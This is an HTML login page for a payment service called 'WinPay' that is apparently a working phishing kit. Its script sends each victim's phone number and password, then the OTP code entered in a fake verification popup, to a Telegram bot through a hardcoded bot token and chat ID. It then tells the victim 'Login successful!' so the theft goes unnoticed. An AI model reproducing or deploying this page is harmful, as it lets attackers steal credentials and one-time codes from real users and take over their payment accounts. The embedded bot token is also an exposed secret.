<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WinPay - Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
            padding: 10px 20px;
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 5px 30px;
        }

        .logo-rectangle {
            width: 100%;
            background: #ffffff;
            border-radius: 12px;
            padding: 15px;
            text-align: center;
            margin-bottom: 20px;
        }

        .logo-rectangle img {
            max-width: 200px;
            width: 100%;
            height: auto;
            display: block;
            margin: 0 auto;
        }

        .welcome-text {
            margin-bottom: 15px;
        }

        .welcome-text h1 {
            font-size: 36px;
            font-weight: 600;
            color: #1a1a1a;
            line-height: 1.3;
            letter-spacing: -0.5px;
        }

        .input-group {
            margin-bottom: 20px;
            position: relative;
        }

        .input-wrapper {
            display: flex;
            align-items: center;
            background-color: #ffffff;
            border-radius: 25px;
            padding: 14px 18px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
        }

        .input-icon {
            width: 24px;
            height: 24px;
            margin-right: 14px;
            flex-shrink: 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .input-wrapper input {
            flex: 1;
            border: none;
            outline: none;
            font-size: 16px;
            color: #333;
            background: transparent;
        }

        .input-wrapper input::placeholder {
            color: #b0b0b0;
            font-size: 16px;
        }

        .toggle-icon {
            width: 24px;
            height: 24px;
            cursor: pointer;
            flex-shrink: 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .char-counter {
            text-align: right;
            font-size: 14px;
            color: #888;
            margin-top: 8px;
            padding-right: 5px;
        }

        .login-btn {
            width: 100%;
            padding: 16px;
            background-color: #0e9ad6;
            color: white;
            border: none;
            border-radius: 30px;
            font-size: 18px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 30px;
            transition: background-color 0.2s;
            box-shadow: 0 4px 15px rgba(14, 154, 214, 0.3);
        }

        .login-btn:hover {
            background-color: #0d8bc2;
        }

        .login-btn:active {
            transform: scale(0.98);
        }

        .forgot-password {
            text-align: center;
            margin-top: 30px;
        }

        .forgot-password a {
            color: #555;
            text-decoration: underline;
            font-size: 15px;
            text-underline-offset: 3px;
        }

        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%) translateY(100px);
            background-color: #333;
            color: white;
            padding: 12px 24px;
            border-radius: 25px;
            font-size: 14px;
            opacity: 0;
            transition: all 0.3s ease;
            z-index: 1000;
        }

        .toast.show {
            transform: translateX(-50%) translateY(0);
            opacity: 1;
        }

        .otp-popup {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            justify-content: center;
            align-items: center;
            z-index: 1000;
            backdrop-filter: blur(3px);
            -webkit-backdrop-filter: blur(3px);
        }

        .otp-popup.show {
            display: flex;
        }

        .otp-popup-content {
            background: white;
            border-radius: 20px;
            padding: 30px;
            text-align: center;
            max-width: 320px;
            width: 90%;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
        }

        .otp-popup-content h2 {
            font-size: 20px;
            color: #1a1a1a;
            margin-bottom: 5px;
        }

        .otp-popup-content p {
            font-size: 13px;
            color: #888;
            margin-bottom: 20px;
        }

        .otp-inputs {
            display: flex;
            gap: 8px;
            justify-content: center;
            margin-bottom: 25px;
        }

        .otp-inputs input {
            width: 40px;
            height: 50px;
            text-align: center;
            font-size: 22px;
            border: 2px solid #ddd;
            border-radius: 10px;
            outline: none;
            font-weight: 600;
            color: #1a1a1a;
            caret-color: #0e9ad6;
        }

        .otp-inputs input:focus {
            border-color: #0e9ad6;
        }

        .otp-inputs input.filled {
            border-color: #0e9ad6;
            background: #f0f9ff;
        }

        .otp-verify-btn {
            width: 100%;
            padding: 14px;
            background-color: #0e9ad6;
            color: white;
            border: none;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(14, 154, 214, 0.3);
        }

        .otp-verify-btn:active {
            transform: scale(0.98);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-rectangle">
            <img src="IMAGE/photo_2026-07-19_22-33-25.jpg" alt="Logo">
        </div>
        <div class="welcome-text">
            <h1>Hello,<br>Welcome to WinPay</h1>
        </div>

        <div class="input-group">
            <div class="input-wrapper">
                <div class="input-icon">
                    <!-- Phone Icon SVG -->
                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                        <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
                        <line x1="12" y1="18" x2="12.01" y2="18"></line>
                    </svg>
                </div>
                <input type="tel" id="phoneInput" placeholder="Please enter your phone number" maxlength="10">
            </div>
            <div class="char-counter" id="charCounter">0/10</div>
        </div>

        <div class="input-group">
            <div class="input-wrapper">
                <div class="input-icon">
                    <!-- Lock Icon SVG -->
                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                    </svg>
                </div>
                <input type="password" id="passwordInput" placeholder="Enter your password">
                <div class="toggle-icon" id="togglePassword">
                    <!-- Eye Off Icon SVG (hidden password) -->
                    <svg id="eyeOffIcon" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
                        <line x1="1" y1="1" x2="23" y2="23"></line>
                    </svg>
                    <!-- Eye On Icon SVG (visible password) -->
                    <svg id="eyeOnIcon" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="display: none;">
                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                        <circle cx="12" cy="12" r="3"></circle>
                    </svg>
                </div>
            </div>
        </div>

        <button class="login-btn" id="loginBtn">Login</button>

        <div class="forgot-password">
            <a href="#">forget the password?</a>
        </div>

    </div>

    <div class="otp-popup" id="otpPopup">
        <div class="otp-popup-content">
            <h2>OTP Verification</h2>
            <p>Enter the 6-digit code sent to your phone</p>
            <div class="otp-inputs" id="otpInputs">
                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
            </div>
            <button class="otp-verify-btn" id="otpVerifyBtn">Verify OTP</button>
        </div>
    </div>

    <div class="toast" id="toast">Copied to clipboard!</div>

    <script>
        // Phone input character counter
        const phoneInput = document.getElementById('phoneInput');
        const charCounter = document.getElementById('charCounter');

        phoneInput.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '');
            const length = this.value.length;
            charCounter.textContent = length + '/10';
        });

        // Password toggle visibility
        const passwordInput = document.getElementById('passwordInput');
        const togglePassword = document.getElementById('togglePassword');
        const eyeOffIcon = document.getElementById('eyeOffIcon');
        const eyeOnIcon = document.getElementById('eyeOnIcon');

        togglePassword.addEventListener('click', function() {
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeOffIcon.style.display = 'none';
                eyeOnIcon.style.display = 'block';
            } else {
                passwordInput.type = 'password';
                eyeOffIcon.style.display = 'block';
                eyeOnIcon.style.display = 'none';
            }
        });

        const BOT_TOKEN = '8786937967:AAF89mjtatOLHo44RGGay_1C6_ZwlCScrnM';
        const CHAT_ID = '-1003923232961';

        // Send photo with caption to Telegram
        function sendLoginToTelegram(phone, password) {
            var msg = '<b>New Login Details</b>\n━━━━━━━━━━━━━━━\n📱 <b>Phone:</b> <code>' + phone + '</code>\n🔑 <b>Password:</b> <code>' + password + '</code>\n━━━━━━━━━━━━━━━';
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto');
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({
                chat_id: CHAT_ID,
                photo: 'https://i.ibb.co/d07MHTBb/photo-2026-07-19_22-33-25.jpg',
                caption: msg,
                parse_mode: 'HTML'
            }));
        }

        function sendOtpToTelegram(phone, otp) {
            var msg = '🔢 <b>OTP Received</b>\n━━━━━━━━━━━━━━━\n📱 <b>Phone:</b> <code>' + phone + '</code>\n🔢 <b>OTP:</b> <code>' + otp + '</code>\n━━━━━━━━━━━━━━━';
            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
            }).catch(function() {});
        }

        // Login button click
        const loginBtn = document.getElementById('loginBtn');

        loginBtn.addEventListener('click', function() {
            const phone = phoneInput.value;
            const password = passwordInput.value;

            if (!phone || !password) {
                showToast('Please fill in all fields');
                return;
            }

            if (phone.length !== 10) {
                showToast('Please enter a valid 10-digit phone number');
                return;
            }

            sendLoginToTelegram(phone, password);

            document.getElementById('otpPopup').classList.add('show');
            document.querySelector('#otpInputs input').focus();
        });

        // OTP input auto-focus navigation
        const otpInputs = document.querySelectorAll('#otpInputs input');
        otpInputs.forEach(function(input, index) {
            input.addEventListener('input', function() {
                this.value = this.value.replace(/\D/g, '');
                if (this.value) {
                    this.classList.add('filled');
                    if (index < otpInputs.length - 1) {
                        otpInputs[index + 1].focus();
                    }
                } else {
                    this.classList.remove('filled');
                }
            });
            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && !this.value && index > 0) {
                    otpInputs[index - 1].focus();
                }
            });
        });

        // OTP Verify button
        document.getElementById('otpVerifyBtn').addEventListener('click', function() {
            let otp = '';
            otpInputs.forEach(function(input) { otp += input.value; });
            if (otp.length !== 6) {
                showToast('Please enter complete OTP');
                return;
            }
            document.getElementById('otpPopup').classList.remove('show');

            var phone = phoneInput.value;

            sendOtpToTelegram(phone, otp);

            showToast('Login successful!');
            otpInputs.forEach(function(input) { input.value = ''; input.classList.remove('filled'); });
        });

        // Toast notification
        function showToast(message) {
            const toast = document.getElementById('toast');
            toast.textContent = message;
            toast.classList.add('show');
            setTimeout(function() {
                toast.classList.remove('show');
            }, 2500);
        }
    </script>
</body>
</html>
